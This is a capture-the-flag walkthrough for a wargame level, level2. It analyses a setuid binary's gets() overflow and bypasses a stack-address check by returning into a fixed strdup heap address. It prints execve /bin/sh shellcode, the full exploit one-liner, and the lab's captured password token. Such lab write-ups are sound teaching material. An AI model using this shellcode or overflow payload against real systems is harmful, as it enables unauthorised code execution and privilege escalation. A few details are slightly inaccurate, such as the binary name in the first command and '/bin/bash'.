Execute the *level2* binary:

```bash
./level1
abcd
```

```
```

> Note the *level2* binary read user input from stdin like the *level1*.

```gdb
disass main
```

> Use __set disassembly-flavor intel__ command to set the intel syntax.

```gdb
Dump of assembler code for function main:
   0x0804853f <+0>:	    push   ebp
   0x08048540 <+1>:	    mov    ebp,esp
   0x08048542 <+3>:	    and    esp,0xfffffff0
   0x08048545 <+6>:	    call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```

Check the *p* function called from the main:

```gdb
disass p
```

```gdb
Dump of assembler code for function p:
...
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>     ; call gets
...
   0x080484fb <+39>:	and    eax,0xb0000000           ; check if the return address
   0x08048500 <+44>:	cmp    eax,0xb0000000           ; start by 0xb...
   0x08048505 <+49>:	jne    0x8048527 <p+83>         ; continue to exit if don't match
...
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>   ; print the return adress
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>    ; exit the program

...
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax      ; copy the input string from the stack to
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>   ; to a new address returned in eax
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

Like in the *level1*, the vulnerable function *gets* is called.

But if the saved return address eip is changed in the stack and start by *0xb...* (AND comparaison), the program print this return address and exit.

And because the local addresses of the the current stack frame start by *0xb...*, we can't point the return address to potential writed instructions in local.

So for continue the program after an potential overwrite, the return address can't start by *0xb...*.

Next, the *strdup* is called. After multiple runs, note the address returned by *strdup* is always the same:

```gdb
break *0x80484ea
break *0x804853d
run
jump *0x80484f2
info register eax
```

```gdb
eax            0x804a008        134520840
```

The strdup return always the same address because the [ASLR](https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR#:~:text=Address%20space%20layout%20randomization%20(ASLR)%20is%20a%20memory%2Dprotection,executables%20are%20loaded%20into%20memory.) is not active:

```bash
file ./level2
```

```
./level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```

> *LSB executable* means the program [doesn't implement ASLR](https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code).

So the address returned by strdup is always __0x804a008__ and not start by *0xb...*.

The solution is to overwrite the saved return address in the stack to point to the new allocated address and put in this new a [shellcode](https://en.wikipedia.org/wiki/Shellcode).

Choose [this](https://shell-storm.org/shellcode/files/shellcode-585.html) shellcode:

```
\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 + \x00
```

> Add *\x00* to end the string "/bin/bash"

To overwrite the saved return address (eip), have to calculate the difference between the buffer address given to *gets* and the return address saved on the top of the stack:

```gdb
break *0x080484ed
run
info register eax
info frame
```

```gdb
eax            0xbffff5dc       -1073744420
...
 Saved registers:
  ebp at 0xbffff628, eip at 0xbffff62c
...
```

> saved eip - eax = 0xbffff62c - 0xbffff5dc = 3221222956 - 3221222876 = __80 bytes__

To overwrite the saved eip return address, the input need to have a length of 80 bytes, starting by the shellcode that needs to bed executed followed by the value we want (here the *run* function address).

> Note the shellcode is going to be written twice: first in the local stack frame with *gets* to reach the return address, and after in the heap with *strdup* where it will be executed later (that's what interests).

- __26__ (26/80) bytes: shellcode
- __54__ (80/80) bytes: padding
- __04__ address bytes: reversed address from the *strdup* call

> The address value need to be reversed because the stack is writed from the top to the bottom, and next it's readed in the opposite way (from the bottom to the end): (0x)804a008 > "\x08\xa0\x04\x08"

```bash
(echo -e "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xa0\x04\x08" ; cat ) | ./level2
cat /home/user/level3/.pass
exit
```

> Use __cat__ to keep stdin open.

```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```